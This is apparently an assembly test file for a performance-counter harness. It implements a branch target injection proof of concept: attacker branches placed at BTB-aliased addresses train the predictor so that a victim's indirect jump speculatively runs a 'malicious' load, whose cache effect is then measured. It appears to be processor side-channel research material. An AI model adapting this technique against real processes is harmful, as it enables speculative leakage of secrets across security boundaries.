%define repeat0  5              ; Number of repetitions of whole test. Default = 8
%define repeat1  repeat1_input              ; Repeat count for loop around testcode. Default = no loop
%define repeat2  1              ; Repeat count for repeat macro around testcode. Default = 100
%define noptype  2

%macro testinitc 0              ; Macro to call in each test before reading counters.
    mov dword[PrintCustomPMC], 1
%endmacro

%macro testcode 0               ; A multi-line macro executing any piece of test code.
    lea rbx, [UserData]
    clflush [rbx+512]
    clflush [target_correct]
    clflush [target_malicious]
    mfence
    SERIALIZE

    %rep 20*use_dbranch
        mov rax, sec_attacker_dbranch_addr
        call rax
        mfence
        SERIALIZE
    %endrep

    %rep 20*use_ibranch
        mov rax, sec_attacker_ibranch_addr
        call rax
        mfence
        SERIALIZE
    %endrep

    call start_victim_ibranch
    
    mfence
    SERIALIZE

    %if measure_data == 1
        READ_PMC_START
        lea rbx, [UserData]
        mov r11, [rbx+512]
        READ_PMC_END
    %elif measure_target_correct == 1
        READ_PMC_START
        mov r11, [target_correct]
        READ_PMC_END
    %elif measure_target_malicious == 1
        READ_PMC_START
        mov r11, [target_malicious]
        READ_PMC_END
    %endif

    %rep 512
     nop
    %endrep
%endmacro


SECTION .sec_victim_ibranch exec
start_victim_ibranch:
    lea r10, [target_correct]
    lea rbx, [UserData]
    mov [rbx], r10
    clflush [rbx]
    mfence

    align 1<<15 ; set BTB index for the victim
    nop
    align 1<<8
    nop
    align 1<<5
    %rep 3
     nop
    %endrep
victim_ibranch:
    jmp [rbx]
    %rep 512
     nop
    %endrep
target_correct:
    %rep 512
     nop
    %endrep
    ret
    %rep 512
     nop
    %endrep
target_malicious:
    mov r11, [rbx+512]
    %rep 512
     nop
    %endrep
    ret

SECTION .sec_attacker_dbranch exec
start_attacker_dbranch:
    nop
    align 1<<15 ; aliased BTB entry with the victim
    nop
    align 1<<8
    nop
    align 1<<5
attacker_dbranch:
    jmp target_inject_d
    %rep 601H ; make target_inject_d[31:0] = target_malicious[31:0]
     nop
    %endrep
target_inject_d:
    %rep 512 
     nop
    %endrep
    ret

SECTION .sec_attacker_ibranch exec
start_attacker_ibranch:
    lea r10, [target_inject_i]
    align 1<<15
    nop
    align 1<<8
    nop
    align 1<<5
    %rep 2
     nop
    %endrep
attacker_ibranch:
    jmp r10
    %rep 601H
     nop
    %endrep
target_inject_i:
    %rep 512
     nop
    %endrep
    ret
